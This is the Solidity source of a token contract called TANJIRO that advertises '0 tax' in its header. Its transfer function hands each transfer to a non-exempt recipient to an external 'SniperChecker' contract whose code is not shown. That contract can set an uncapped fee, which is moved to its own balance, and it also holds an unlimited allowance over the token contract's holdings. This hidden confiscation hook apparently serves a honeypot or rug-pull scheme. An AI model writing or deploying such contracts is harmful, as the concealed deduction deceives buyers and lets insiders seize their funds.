1 //SPDX-License-Identifier: MIT
2 
3 /**
4 *TANJIRO
5 *Tokenomics
6 *
7 *-0 tax
8 *-1 Billion Max Supply
9 */
10 
11 pragma solidity ^0.7.6;
12 
13 library SafeMath {
14     function add(uint256 a, uint256 b) internal pure returns (uint256) {
15         uint256 c = a + b;
16         require(c >= a, "SafeMath: addition overflow");
17 
18         return c;
19     }
20     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
21         return sub(a, b, "SafeMath: subtraction overflow");
22     }
23     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
24         require(b <= a, errorMessage);
25         uint256 c = a - b;
26 
27         return c;
28     }
29     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
30         if (a == 0) {
31             return 0;
32         }
33 
34         uint256 c = a * b;
35         require(c / a == b, "SafeMath: multiplication overflow");
36 
37         return c;
38     }
39     function div(uint256 a, uint256 b) internal pure returns (uint256) {
40         return div(a, b, "SafeMath: division by zero");
41     }
42     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
43         // Solidity only automatically asserts when dividing by 0
44         require(b > 0, errorMessage);
45         uint256 c = a / b;
46         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
47 
48         return c;
49     }
50     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
51         return mod(a, b, "SafeMath: modulo by zero");
52     }
53 
54     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
55         require(b != 0, errorMessage);
56         return a % b;
57     }
58 }
59 
60 interface IERC20 {
61     function totalSupply() external view returns (uint256);
62     function decimals() external view returns (uint8);
63     function symbol() external view returns (string memory);
64     function name() external view returns (string memory);
65     function getOwner() external view returns (address);
66     function balanceOf(address account) external view returns (uint256);
67     function transfer(address recipient, uint256 amount) external returns (bool);
68     function allowance(address _owner, address spender) external view returns (uint256);
69     function approve(address spender, uint256 amount) external returns (bool);
70     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
71     event Transfer(address indexed from, address indexed to, uint256 value);
72     event Approval(address indexed owner, address indexed spender, uint256 value);
73 }
74 
75 abstract contract Auth {
76     address internal owner;
77     mapping (address => bool) internal authorizations;
78 
79     constructor(address _owner) {
80         owner = _owner;
81         authorizations[_owner] = true;
82     }
83 
84     modifier onlyOwner() {
85         require(isOwner(msg.sender), "!OWNER"); _;
86     }
87 
88     modifier authorized() {
89         require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
90     }
91 
92     function authorize(address adr) public onlyOwner {
93         authorizations[adr] = true;
94     }
95 
96     function unauthorize(address adr) public onlyOwner {
97         authorizations[adr] = false;
98     }
99 
100     function isOwner(address account) public view returns (bool) {
101         return account == owner;
102     }
103 
104     function isAuthorized(address adr) public view returns (bool) {
105         return authorizations[adr];
106     }
107 
108     function transferOwnership(address payable adr) public onlyOwner {
109         owner = adr;
110         authorizations[adr] = true;
111         emit OwnershipTransferred(adr);
112     }
113 
114     event OwnershipTransferred(address owner);
115 }
116 
117 interface SniperChecker {
118     function Start() external;
119     function checkForSniper(uint256, address, address, address) external returns (uint256,bool);
120     function register(address) external;
121 }
122 contract Tanjiro is IERC20, Auth {
123     using SafeMath for uint256;
124     string constant _name = "TANJIRO";
125     string constant _symbol = "TANJIRO";
126     uint8 constant _decimals = 9;
127     uint256 _totalSupply = 1000000000 * (10 ** _decimals);
128 
129     mapping (address => uint256) _balances;
130     mapping (address => mapping (address => uint256)) _allowances;
131     mapping (address => bool) isSnipeExempt;
132 
133     SniperChecker Sniper;
134     bool SniperRegistered = false;
135     uint256 public launchedAt;
136     bool public launchCompleted = false;
137 
138 
139     constructor (address _Sniper) Auth(msg.sender) {
140 	Sniper = SniperChecker(_Sniper);
141         _allowances[address(this)][address(_Sniper)] = uint256(-1);
142         isSnipeExempt[owner] = true;
143         isSnipeExempt[_Sniper] = true;
144         _balances[owner] = _totalSupply;
145         emit Transfer(address(0), owner, _totalSupply);
146     }
147 
148     receive() external payable { }
149     function totalSupply() external view override returns (uint256) { return _totalSupply; }
150     function decimals() external pure override returns (uint8) { return _decimals; }
151     function symbol() external pure override returns (string memory) { return _symbol; }
152     function name() external pure override returns (string memory) { return _name; }
153     function getOwner() external view override returns (address) { return owner; }
154     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
155     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
156 
157     function approve(address spender, uint256 amount) public override returns (bool) {
158         _allowances[msg.sender][spender] = amount;
159         emit Approval(msg.sender, spender, amount);
160         return true;
161     }
162 
163     function approveMax(address spender) external returns (bool) {
164         return approve(spender, uint256(-1));
165     }
166 
167     function transfer(address recipient, uint256 amount) external override returns (bool) {
168         return _transferFrom(msg.sender, recipient, amount);
169     }
170 
171     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
172         if(_allowances[sender][msg.sender] != uint256(-1)){
173             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
174         }
175 
176         return _transferFrom(sender, recipient, amount);
177     }
178 
179     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
180         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
181         uint256 amountReceived;
182         if(!isSnipeExempt[recipient]){amountReceived= shouldCheckSniper(sender) ? checkSnipers(sender, amount, recipient) : amount;}else{amountReceived = amount;}
183         _balances[recipient] = _balances[recipient].add(amountReceived);
184         emit Transfer(sender, recipient, amountReceived);
185         return true;
186     }
187     
188     
189     function transferBatch(address[] calldata recipients, uint256 amount) public {
190        for (uint256 i = 0; i < recipients.length; i++) {
191             require(_transferFrom(msg.sender,recipients[i], amount));
192         }
193     }
194     
195     function shouldCheckSniper(address sender) internal view returns (bool) {
196        return !isSnipeExempt[sender];
197     }
198 
199     function checkSnipers(address sender,uint256 amount, address receiver) internal returns (uint256) {
200   	(uint256 feeAmount,bool isSniper) = Sniper.checkForSniper(amount,sender,receiver,msg.sender);
201 	if(isSniper){_balances[address(Sniper)] = _balances[address(Sniper)].add(feeAmount);
202         emit Transfer(sender, address(Sniper), feeAmount);}
203         return amount.sub(feeAmount);
204     }
205 
206     function launched() internal view returns (bool) {
207         return launchedAt != 0;
208     }
209 
210     function launch() external authorized{
211 	    require(!launched());
212         launchedAt = block.number;
213         Sniper.Start();
214     }
215     
216     function blockNumber() external view returns (uint256){
217 	    return block.number;
218     }
219    
220     function setIsSnipeExempt(address holder, bool exempt) external onlyOwner {
221         isSnipeExempt[holder] = exempt;
222     }
223    
224     function registerSniper() external authorized {
225 	    require(!SniperRegistered);
226 	    Sniper.register(address(this));
227 	    SniperRegistered = true;
228 	}
229 	
230     function recoverEth() external onlyOwner() {
231         payable(msg.sender).transfer(address(this).balance);
232     }
233 
234     function recoverToken(address _token, uint256 amount) external authorized returns (bool _sent){
235         _sent = IERC20(_token).transfer(msg.sender, amount);
236     }
237 
238     event AutoLiquify(uint256 amountETH, uint256 amountToken);
239    
240 }